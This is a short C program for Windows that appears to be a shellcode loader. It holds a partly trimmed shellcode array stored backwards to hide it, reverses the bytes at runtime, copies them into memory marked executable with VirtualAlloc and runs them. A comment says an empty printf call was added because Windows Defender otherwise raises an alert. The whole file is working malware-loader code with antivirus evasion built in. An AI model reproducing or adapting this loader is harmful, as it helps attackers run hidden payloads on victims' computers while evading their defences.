#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// shellcode length
#define SC_LENGTH 782 

int main(void) {

	char reversed_shellcode[SC_LENGTH] = { 0xd5, 0xff, 0x56, 0xa2, 0xb5,
	---trimmed---
	 0xf0, 0xe4, 0x83, 0x48, 0xfc };
	char shellcode[SC_LENGTH] = { 0x00 }; //Buffer to store the shellcode after reversing to original

	// reverse our array of ints
	for (int i = 0; i < SC_LENGTH; i++)
	{
		printf(""); // defender fires an alert on this routine without this
		shellcode[i] = reversed_shellcode[SC_LENGTH - i - 1];
	}

    // Allocate memory in a writable, executable region and execute
    void* exec_mem = VirtualAlloc(NULL, SC_LENGTH, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        printf("Failed to allocate memory for shellcode.\n");
        return 1;
    }

    RtlCopyMemory(exec_mem, shellcode, SC_LENGTH);
    printf("[+] Copied shellcode to allocated memory\n");
    void (*func)() = (void (*)())exec_mem;
    printf("[+] Executing shellcode in memory...\n");
    func();

    VirtualFree(exec_mem, 0, MEM_RELEASE);

	return 0;
}
